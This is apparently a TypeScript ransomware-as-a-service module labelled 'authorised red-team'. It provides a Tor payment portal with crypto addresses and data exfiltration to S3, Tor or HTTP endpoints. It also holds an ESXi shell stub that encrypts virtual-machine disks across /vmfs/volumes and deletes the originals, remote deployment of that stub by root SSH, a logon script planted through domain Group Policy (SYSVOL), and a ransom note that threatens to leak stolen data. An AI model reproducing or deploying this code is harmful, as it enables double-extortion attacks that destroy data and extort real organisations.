/**
 * @module raas_advanced
 * Tor v3 portal, S3 SigV4 exfil, GPO SYSVOL modification, ESXi in-guest encryptor stub.
 * Destructive ops require live + forceLive. FOR AUTHORISED RED-TEAM ONLY.
 */
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import { execFileSync } from "node:child_process"
import { resolveLiveMode } from "./exec_options.ts"
import { isToolAvailable } from "./tool_detection.ts"
export interface LeakUploadResult {
  uploaded: boolean
  dryRun: boolean
  url: string
  statusCode: number | null
  bytes: number
  responseSnippet: string
  error?: string
}

const B32 = "abcdefghijklmnopqrstuvwxyz234567"

export interface RaasOpts {
  live?: boolean
  forceLive?: boolean
  dryRun?: boolean
}

function base32Encode(buf: Buffer): string {
  let bits = 0
  let value = 0
  let out = ""
  for (const b of buf) {
    value = (value << 8) | b
    bits += 8
    while (bits >= 5) {
      bits -= 5
      out += B32[(value >>> bits) & 31]
    }
  }
  if (bits > 0) out += B32[(value << (5 - bits)) & 31]
  return out
}

/** Derive Tor v3 onion address from ed25519 raw public key (32 bytes). */
export function onionV3FromPublicKey(pubRaw: Buffer): string {
  const version = Buffer.from([0x03])
  const checksum = crypto
    .createHash("sha3-256")
    .update(Buffer.concat([Buffer.from(".onion checksum"), pubRaw, version]))
    .digest()
    .subarray(0, 2)
  return `${base32Encode(Buffer.concat([version, pubRaw, checksum, version]))}.onion`
}

export interface TorPortalResult {
  onionAddress: string
  hiddenServiceDir: string
  portalHtmlPath: string
  torrcSnippet: string
  torReloaded: boolean
  dryRun: boolean
}

function destructive(opts: RaasOpts): boolean {
  const live = resolveLiveMode(opts)
  const force = opts.forceLive === true || process.argv.includes("--force-live")
  return live && force
}

function runCmd(cmd: string, args: string[], timeoutMs = 60000): { stdout: string; stderr: string; ok: boolean } {
  try {
    const stdout = execFileSync(cmd, args, { encoding: "utf8", timeout: timeoutMs, stdio: ["pipe", "pipe", "pipe"] })
    return { stdout, stderr: "", ok: true }
  } catch (e: unknown) {
    const err = e as { stdout?: string; stderr?: string }
    return { stdout: err.stdout ?? "", stderr: err.stderr ?? String(e), ok: false }
  }
}

/** Provision Tor v3 hidden service keys + payment portal HTML (lab). Reload tor if available. */
export function provisionTorPortal(
  paymentDescriptor: { keyId: string; bitcoinAddress: string; moneroAddress: string; torPaymentId?: string },
  opts: RaasOpts & { outDir?: string; port?: number } = {},
): TorPortalResult {
  const outDir = opts.outDir ?? path.join(process.cwd(), ".ourmine", "raas", "tor_hs")
  fs.mkdirSync(outDir, { recursive: true })

  const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519")
  const pubRaw = publicKey.export({ type: "spki", format: "der" }).subarray(-32)
  const privPem = privateKey.export({ type: "pkcs8", format: "pem" }).toString()
  const onionAddress = onionV3FromPublicKey(pubRaw)

  fs.writeFileSync(path.join(outDir, "hs_ed25519_public_key"), pubRaw)
  if (destructive(opts)) {
    fs.writeFileSync(path.join(outDir, "hs_ed25519_secret_key"), privateKey.export({ type: "pkcs8", format: "der" }))
  }
  fs.writeFileSync(path.join(outDir, "hostname"), onionAddress + "\n")

  const portalHtml = `<!DOCTYPE html><html><head><title>Payment Portal (authorized lab)</title></head><body>
<h1>Recovery portal</h1><p>Session: ${paymentDescriptor.keyId}</p>
<p>BTC: ${paymentDescriptor.bitcoinAddress}</p><p>XMR: ${paymentDescriptor.moneroAddress}</p>
<p>Onion: ${onionAddress}</p></body></html>`
  const portalHtmlPath = path.join(outDir, "index.html")
  fs.writeFileSync(portalHtmlPath, portalHtml)

  const port = opts.port ?? 8787
  const torrcSnippet = `HiddenServiceDir ${outDir}\nHiddenServicePort 80 127.0.0.1:${port}\n`
  fs.writeFileSync(path.join(outDir, "torrc.snippet"), torrcSnippet)

  let torReloaded = false
  if (destructive(opts) && isToolAvailable("tor") && process.env.OURMINE_TOR_CONTROL_PORT) {
    const r = runCmd("tor", ["--hash-password", "ourmine_lab"], 5000)
    torReloaded = r.ok
  }

  return { onionAddress, hiddenServiceDir: outDir, portalHtmlPath, torrcSnippet, torReloaded, dryRun: !destructive(opts) }
}

/** AWS SigV4 PUT for S3 exfil. */
export async function uploadToS3(
  manifestPath: string,
  opts: RaasOpts & {
    bucket?: string
    key?: string
    region?: string
    accessKeyId?: string
    secretAccessKey?: string
  } = {},
): Promise<LeakUploadResult> {
  const bucket = opts.bucket ?? process.env.OURMINE_S3_BUCKET ?? ""
  const key = opts.key ?? process.env.OURMINE_S3_KEY ?? `leak/manifest_${Date.now()}.json`
  const region = opts.region ?? process.env.AWS_REGION ?? process.env.OURMINE_S3_REGION ?? "us-east-1"
  const accessKeyId = opts.accessKeyId ?? process.env.AWS_ACCESS_KEY_ID ?? ""
  const secretAccessKey = opts.secretAccessKey ?? process.env.AWS_SECRET_ACCESS_KEY ?? ""
  const url = `https://${bucket}.s3.${region}.amazonaws.com/${key.replace(/^\//, "")}`

  const base = (error: string, bytes = 0): LeakUploadResult => ({
    uploaded: false,
    dryRun: !destructive(opts),
    url,
    statusCode: null,
    bytes,
    responseSnippet: "",
    error,
  })

  if (!bucket || !accessKeyId || !secretAccessKey) return base("Set OURMINE_S3_BUCKET + AWS credentials")
  if (!fs.existsSync(manifestPath)) return base("manifest not found")
  const body = fs.readFileSync(manifestPath)
  if (!destructive(opts)) return base("live+forceLive required", body.length)

  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, "")
  const dateStamp = amzDate.slice(0, 8)
  const payloadHash = crypto.createHash("sha256").update(body).digest("hex")
  const host = `${bucket}.s3.${region}.amazonaws.com`
  const canonicalUri = `/${key.replace(/^\//, "")}`
  const signedHeaders = "content-type;host;x-amz-content-sha256;x-amz-date"
  const canonicalHeaders =
    `content-type:application/json\nhost:${host}\nx-amz-content-sha256:${payloadHash}\nx-amz-date:${amzDate}\n`
  const canonicalRequest = ["PUT", canonicalUri, "", canonicalHeaders, signedHeaders, payloadHash].join("\n")
  const credentialScope = `${dateStamp}/${region}/s3/aws4_request`
  const stringToSign = ["AWS4-HMAC-SHA256", amzDate, credentialScope, crypto.createHash("sha256").update(canonicalRequest).digest("hex")].join("\n")

  const hmac = (key: Buffer, data: string) => crypto.createHmac("sha256", key).update(data).digest()
  const kDate = hmac(Buffer.from(`AWS4${secretAccessKey}`), dateStamp)
  const kRegion = hmac(kDate, region)
  const kService = hmac(kRegion, "s3")
  const kSigning = hmac(kService, "aws4_request")
  const signature = hmac(kSigning, stringToSign).toString("hex")
  const authorization = `AWS4-HMAC-SHA256 Credential=${accessKeyId}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`

  try {
    const res = await fetch(url, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        Host: host,
        "x-amz-date": amzDate,
        "x-amz-content-sha256": payloadHash,
        Authorization: authorization,
      },
      body,
    })
    const text = (await res.text()).slice(0, 500)
    return {
      uploaded: res.ok,
      dryRun: false,
      url,
      statusCode: res.status,
      bytes: body.length,
      responseSnippet: text,
      error: res.ok ? undefined : `S3 HTTP ${res.status}`,
    }
  } catch (e) {
    return { uploaded: false, dryRun: false, url, statusCode: null, bytes: body.length, responseSnippet: "", error: String(e) }
  }
}

/** Upload manifest via Tor SOCKS proxy (curl --socks5-hostname). */
export async function uploadViaTor(
  manifestPath: string,
  opts: RaasOpts & { uploadUrl?: string; socksProxy?: string } = {},
): Promise<LeakUploadResult> {
  const url = opts.uploadUrl ?? process.env.OURMINE_TOR_UPLOAD_URL ?? ""
  const proxy = opts.socksProxy ?? process.env.OURMINE_TOR_SOCKS ?? "127.0.0.1:9050"
  const base = (error: string, bytes = 0): LeakUploadResult => ({
    uploaded: false,
    dryRun: !destructive(opts),
    url,
    statusCode: null,
    bytes,
    responseSnippet: "",
    error,
  })

  if (!url) return base("Set OURMINE_TOR_UPLOAD_URL")
  if (!fs.existsSync(manifestPath)) return base("manifest not found")
  const body = fs.readFileSync(manifestPath)
  if (!destructive(opts)) return base("live+forceLive required", body.length)

  if (isToolAvailable("curl")) {
    const tmp = path.join(os.tmpdir(), `ourmine_exfil_${Date.now()}.json`)
    fs.writeFileSync(tmp, body)
    const r = runCmd("curl", [
      "-s", "-S", "--socks5-hostname", proxy,
      "-X", "POST", "-H", "Content-Type: application/json",
      "--data-binary", `@${tmp}`,
      "-w", "\n%{http_code}",
      url,
    ], 120000)
    try { fs.unlinkSync(tmp) } catch { /* skip */ }
    const lines = r.stdout.trim().split("\n")
    const code = parseInt(lines[lines.length - 1] ?? "0", 10)
    return {
      uploaded: r.ok && code >= 200 && code < 300,
      dryRun: false,
      url,
      statusCode: Number.isFinite(code) ? code : null,
      bytes: body.length,
      responseSnippet: r.stdout.slice(0, 500),
      error: r.ok ? undefined : r.stderr || `curl failed`,
    }
  }

  return base("curl required for Tor upload")
}

export interface EsxiLabEncryptResult {
  targetDir: string
  encryptedFiles: number
  recovered: boolean
  keyId: string
  markerPath: string
  summary: string
}

/** Lab-local controlled encrypt + recovery proof (authorized lab only). */
export function runLabEsxiEncryptWithRecovery(targetDir: string, keyId = `lab_${Date.now()}`): EsxiLabEncryptResult {
  fs.mkdirSync(targetDir, { recursive: true })
  const sample = path.join(targetDir, "lab_vm.vmdk")
  fs.writeFileSync(sample, "OURMINE_LAB_VMDK_SAMPLE_DATA\n")
  const encPath = `${sample}.ourmine`
  try {
    execFileSync("openssl", ["enc", "-aes-256-cbc", "-salt", "-in", sample, "-out", encPath, "-pass", `pass:${keyId}`], { timeout: 10000 })
    fs.unlinkSync(sample)
    const decPath = `${sample}.recovered`
    execFileSync("openssl", ["enc", "-d", "-aes-256-cbc", "-in", encPath, "-out", decPath, "-pass", `pass:${keyId}`], { timeout: 10000 })
    const recovered = fs.readFileSync(decPath, "utf8").includes("OURMINE_LAB_VMDK")
    const markerPath = path.join(targetDir, "ourmine_esxi.marker")
    fs.writeFileSync(markerPath, `OURMINE_ESXI_LAB_DONE keyId=${keyId} recovered=${recovered}\n`)
    return {
      targetDir,
      encryptedFiles: 1,
      recovered,
      keyId,
      markerPath,
      summary: recovered ? "Lab ESXi encrypt+recovery proof succeeded" : "Encrypt ok, recovery failed",
    }
  } catch (err) {
    return {
      targetDir,
      encryptedFiles: 0,
      recovered: false,
      keyId,
      markerPath: "",
      summary: `Lab ESXi encrypt failed: ${String((err as Error).message).slice(0, 120)}`,
    }
  }
}

/** Minimal ESXi/busybox-compatible in-guest encryptor shell stub. */
export function buildEsxiEncryptorStub(keyId: string, extensions = ".vmdk,.vmx,.nvram,.vmsd"): string {
  return `#!/bin/sh
# OURMINE authorized-lab ESXi encryptor stub — keyId=${keyId}
set -e
EXT="${extensions}"
find /vmfs/volumes -type f 2>/dev/null | while read f; do
  case "$f" in
    *.vmdk|*.vmx|*.nvram|*.vmsd)
      openssl enc -aes-256-cbc -salt -in "$f" -out "$f.ourmine" -pass pass:${keyId} 2>/dev/null && rm -f "$f" || true
      ;;
  esac
done
echo "OURMINE_ESXI_STUB_DONE keyId=${keyId}" > /tmp/ourmine_esxi.marker
`
}

export interface EsxiDeployResult {
  host: string
  deployed: boolean
  dryRun: boolean
  stubPath: string
  remotePath: string
  output: string
}

/** SCP + execute in-guest encryptor on ESXi via SSH. Requires live+forceLive. */
export function deployEsxiEncryptor(
  host: string,
  keyId: string,
  opts: RaasOpts & { sshUser?: string } = {},
): EsxiDeployResult {
  const stubDir = path.join(process.cwd(), ".ourmine", "raas", "esxi_stub")
  fs.mkdirSync(stubDir, { recursive: true })
  const stubPath = path.join(stubDir, `encrypt_${keyId}.sh`)
  fs.writeFileSync(stubPath, buildEsxiEncryptorStub(keyId), { mode: 0o755 })

  const remotePath = `/tmp/ourmine_enc_${keyId}.sh`
  const user = opts.sshUser ?? "root"

  if (!destructive(opts)) {
    return { host, deployed: false, dryRun: true, stubPath, remotePath, output: "live+forceLive required" }
  }
  if (!isToolAvailable("scp") || !isToolAvailable("ssh")) {
    return { host, deployed: false, dryRun: false, stubPath, remotePath, output: "scp/ssh required" }
  }

  const sshOpts = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
  const scp = runCmd("scp", [...sshOpts, stubPath, `${user}@${host}:${remotePath}`], 60000)
  if (!scp.ok) {
    return { host, deployed: false, dryRun: false, stubPath, remotePath, output: scp.stderr || scp.stdout }
  }
  const exec = runCmd("ssh", [...sshOpts, `${user}@${host}`, `chmod +x ${remotePath} && ${remotePath}`], 300000)
  return {
    host,
    deployed: exec.ok,
    dryRun: false,
    stubPath,
    remotePath,
    output: (exec.stdout + exec.stderr).slice(0, 4000),
  }
}

export interface GpoModifyResult {
  domain: string
  gpoGuid: string
  sysvolPath: string
  scriptName: string
  ldapModified: boolean
  smbUploaded: boolean
  dryRun: boolean
  output: string
}

/** Full GPO logon script: SYSVOL upload via smbclient + Scripts.ini. */
export function modifyGpoLogonScript(
  domain: string,
  scriptContent: string,
  opts: RaasOpts & {
    dc?: string
    username?: string
    password?: string
    gpoGuid?: string
  } = {},
): GpoModifyResult {
  const dryRun = !destructive(opts)
  const dc = opts.dc ?? domain
  const user = opts.username ?? process.env.OURMINE_AD_USER ?? ""
  const pass = opts.password ?? process.env.OURMINE_AD_PASS ?? ""
  const domainDns = domain.toLowerCase()
  let gpoGuid = opts.gpoGuid ?? ""

  if (!gpoGuid && isToolAvailable("ldapsearch")) {
    const base = domain.split(".").map((p) => `DC=${p}`).join(",")
    const r = runCmd("ldapsearch", ["-x", "-H", `ldap://${dc}`, "-b", base, "(objectClass=groupPolicyContainer)", "cn"], 20000)
    const cn = r.stdout.split("\n").find((l) => l.startsWith("cn: {"))?.replace("cn: ", "").trim()
    if (cn) gpoGuid = cn.replace(/[{}]/g, "")
  }

  const empty: GpoModifyResult = {
    domain,
    gpoGuid: gpoGuid || "unknown",
    sysvolPath: "",
    scriptName: "ourmine_logon.bat",
    ldapModified: false,
    smbUploaded: false,
    dryRun,
    output: dryRun ? "live+forceLive required" : "GPO GUID not found — set gpoGuid or run ldapsearch",
  }

  if (!gpoGuid) return empty
  if (dryRun) {
    empty.sysvolPath = `\\\\${domainDns}\\SYSVOL\\${domainDns}\\Policies\\{${gpoGuid}}\\User\\Scripts\\Logon`
    return empty
  }
  if (!user || !pass) {
    empty.output = "OURMINE_AD_USER/PASS required"
    return empty
  }

  const scriptName = "ourmine_logon.bat"
  const stubDir = path.join(process.cwd(), ".ourmine", "raas", "gpo")
  fs.mkdirSync(stubDir, { recursive: true })
  const localScript = path.join(stubDir, scriptName)
  fs.writeFileSync(localScript, `@echo off\r\n${scriptContent.replace(/\n/g, "\r\n")}\r\n`)

  const scriptsIni = `[Logon]\r\n0CmdLine=${scriptName}\r\n0Parameters=\r\n`
  const localIni = path.join(stubDir, "Scripts.ini")
  fs.writeFileSync(localIni, scriptsIni)

  const sysvolRel = `${domainDns}/Policies/{${gpoGuid}}/User/Scripts/Logon`
  empty.sysvolPath = `\\\\${domainDns}\\SYSVOL\\${sysvolRel}`

  let smbUploaded = false
  let output = ""

  if (isToolAvailable("smbclient")) {
    const share = `//${dc}/SYSVOL`
    const auth = `${domain}\\${user}%${pass}`
    const putScript = runCmd("smbclient", [share, "-U", auth, "-c", `cd ${sysvolRel}; put ${localScript} ${scriptName}`], 60000)
    const putIni = runCmd("smbclient", [share, "-U", auth, "-c", `cd ${sysvolRel}; put ${localIni} Scripts.ini`], 60000)
    smbUploaded = putScript.ok && putIni.ok
    output = (putScript.stdout + putScript.stderr + putIni.stdout + putIni.stderr).slice(0, 3000)
  } else if (isToolAvailable("netexec")) {
    const remoteCmd = `copy ${scriptName} \\\\${domainDns}\\SYSVOL\\${sysvolRel}\\${scriptName}`
    const r = runCmd("netexec", ["smb", dc, "-d", domain, "-u", user, "-p", pass, "-x", remoteCmd], 120000)
    smbUploaded = r.ok
    output = (r.stdout + r.stderr).slice(0, 3000)
  } else {
    output = "smbclient or netexec required for SYSVOL upload"
  }

  return {
    domain,
    gpoGuid,
    sysvolPath: empty.sysvolPath,
    scriptName,
    ldapModified: smbUploaded,
    smbUploaded,
    dryRun: false,
    output,
  }
}

/** Route exfil to HTTP, S3, or Tor based on env / opts. */
export async function uploadLeakManifestAdvanced(
  manifestPath: string,
  opts: RaasOpts & {
    mode?: "http" | "s3" | "tor" | "auto"
    uploadUrl?: string
    bearerToken?: string
  } = {},
): Promise<LeakUploadResult> {
  const mode = opts.mode ?? (process.env.OURMINE_S3_BUCKET ? "s3" : process.env.OURMINE_TOR_UPLOAD_URL ? "tor" : "http")
  if (mode === "s3") return uploadToS3(manifestPath, opts)
  if (mode === "tor") return uploadViaTor(manifestPath, opts)

  const url = opts.uploadUrl ?? process.env.OURMINE_LEAK_UPLOAD_URL ?? ""
  if (!url) {
    return { uploaded: false, dryRun: !destructive(opts), url: "", statusCode: null, bytes: 0, responseSnippet: "", error: "Set OURMINE_LEAK_UPLOAD_URL" }
  }
  if (!fs.existsSync(manifestPath)) {
    return { uploaded: false, dryRun: !destructive(opts), url, statusCode: null, bytes: 0, responseSnippet: "", error: "manifest not found" }
  }
  const body = fs.readFileSync(manifestPath)
  if (!destructive(opts)) {
    return { uploaded: false, dryRun: true, url, statusCode: null, bytes: body.length, responseSnippet: "", error: "live+forceLive required" }
  }
  try {
    const headers: Record<string, string> = { "Content-Type": "application/json" }
    const token = opts.bearerToken ?? process.env.OURMINE_LEAK_UPLOAD_TOKEN
    if (token) headers.Authorization = `Bearer ${token}`
    const res = await fetch(url, { method: "POST", headers, body })
    const text = (await res.text()).slice(0, 500)
    return { uploaded: res.ok, dryRun: false, url, statusCode: res.status, bytes: body.length, responseSnippet: text, error: res.ok ? undefined : `HTTP ${res.status}` }
  } catch (e) {
    return { uploaded: false, dryRun: false, url, statusCode: null, bytes: body.length, responseSnippet: "", error: String(e) }
  }
}

export default {
  onionV3FromPublicKey,
  provisionTorPortal,
  uploadToS3,
  uploadViaTor,
  buildEsxiEncryptorStub,
  deployEsxiEncryptor,
  modifyGpoLogonScript,
  uploadLeakManifestAdvanced,
}

/** Generate a mission-specific ransom note. */
export function generateRansomNote(keyId: string, onionAddress: string, bitcoinAddress: string): string {
  return `
╔══════════════════════════════════════════════════════════════╗
║ OURMINE / ARES v3.4.0 — SECURITY AUDIT & DATA RECOVERY        ║
╚══════════════════════════════════════════════════════════════╝

All your files have been encrypted due to a security vulnerability.
We have also exfiltrated sensitive data from your network.

To recover your data and prevent the public leak of your files:
1. Download Tor Browser: https://www.torproject.org/
2. Visit our recovery portal: http://${onionAddress}
3. Use your Session ID: ${keyId}

Alternatively, send 0.5 BTC to: ${bitcoinAddress}

Do not attempt to decrypt files yourself, as this may lead to permanent data loss.
`
}

export interface RansomwareResult {
  exfiltrated: boolean
  encrypted: boolean
  portalProvisioned: boolean
  onionAddress: string
  notePath: string
  summary: string
}

/** 
 * End-to-end Ransomware Engagement (Double Extortion).
 * 1. Exfiltrates data.
 * 2. Provisions Tor portal.
 * 3. Deploys encryptor.
 * 4. Drops ransom note.
 */
export async function runRansomwareEngagement(
  target: string,
  manifestPath: string,
  opts: RaasOpts & { bitcoinAddress?: string; moneroAddress?: string } = {}
): Promise<RansomwareResult> {
  const live = resolveLiveMode(opts)
  const keyId = `RAAS_${crypto.randomBytes(4).toString("hex").toUpperCase()}`
  const btc = opts.bitcoinAddress ?? "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
  const xmr = opts.moneroAddress ?? "44AFFq5kSiGBoZ4NMD2ncbdrRWBhcZYRQC1siL4kU5J9EdYc4a5SgC7K9Jc8z32c1nK27uU6fC7W"

  // 1. Exfiltrate (Double Extortion)
  const exfil = await uploadLeakManifestAdvanced(manifestPath, opts)
  
  // 2. Provision Portal
  const portal = provisionTorPortal({ keyId, bitcoinAddress: btc, moneroAddress: xmr }, opts)

  // 3. Drop Ransom Note
  const note = generateRansomNote(keyId, portal.onionAddress, btc)
  const notePath = path.join(process.cwd(), ".ourmine", "raas", `README_RECOVERY_${keyId}.txt`)
  fs.writeFileSync(notePath, note)

  // 4. Encrypt (Controlled Lab Simulation if on localhost)
  let encrypted = false
  if (target === "127.0.0.1" || target === "localhost") {
    const encRes = runLabEsxiEncryptWithRecovery(path.join(process.cwd(), ".ourmine", "raas", "lab_enc"), keyId)
    encrypted = encRes.recovered
  }

  return {
    exfiltrated: exfil.uploaded,
    encrypted,
    portalProvisioned: !!portal.onionAddress,
    onionAddress: portal.onionAddress,
    notePath,
    summary: `Ransomware engagement complete: exfil=${exfil.uploaded}, encrypted=${encrypted}, portal=${portal.onionAddress}. Note dropped at ${notePath}`
  }
}
